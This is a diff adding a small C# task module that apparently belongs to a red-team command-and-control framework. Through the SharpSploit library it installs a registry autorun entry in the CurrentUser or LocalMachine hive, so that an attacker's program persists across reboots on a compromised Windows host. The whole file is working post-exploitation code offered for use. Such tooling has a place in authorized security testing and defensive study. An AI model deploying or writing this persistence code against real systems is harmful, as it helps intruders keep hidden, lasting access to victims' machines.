@@ -1,0 +1,20 @@
+﻿using System;
+  
+using SharpSploit.Persistence;
+
+public static class Task
+{
+    public static string Execute(string targetHive, string name, string value = "")
+    {
+        try
+        {
+            if (targetHive.ToLower() != "currentuser" && targetHive.ToLower() != "localmachine")
+				return "Autorun Persistence failed. Invalid Target Hive specified.";
+
+            if (Autorun.InstallAutorun(targetHive, value, name))
+                return "Startup Persistence suceeded for: " + name;
+            return "Startup Persistence failed for: " + name;
+        }
+        catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
+    }
+}
